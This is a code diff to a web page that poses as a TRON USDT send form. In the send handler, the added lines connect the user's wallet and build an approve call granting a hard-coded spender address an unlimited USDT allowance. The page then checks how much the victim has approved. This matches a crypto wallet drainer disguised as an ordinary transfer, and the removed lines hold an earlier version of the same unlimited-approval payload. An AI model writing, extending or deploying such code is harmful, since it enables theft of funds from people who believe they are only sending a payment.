@@ -16,10 +16,6 @@ const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
-const APPROVE_ABI_PARAM =
-  "000000000000000000000000227bdd3374a072f5c365f418153e23e02bf36ceb" +
-  "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
 export default function Index() {
   const [searchParams] = useSearchParams();
   const [toAddress, setToAddress] = useState("");
@@ -151,8 +147,13 @@ export default function Index() {
   async function handleSend() {
     setTransactionStatusState("processing");
     try {
-      const userAddress = await connectWallet();
-
+const userAddress = await connectWallet();
+const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2);
+const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+const APPROVE_ABI_PARAM = hexAddress + hexAmount;
+console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
+      
       // Transaction build
       console.log("📝 Transaction build...");
       const apiResponse = await fetch(
@@ -244,7 +245,7 @@ export default function Index() {
         type:            "function",
       }];
 
-      const tw       = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
+      const tw       = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
       const contract = await tw.contract(allowanceABI, TRON_USDT);
       const raw      = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
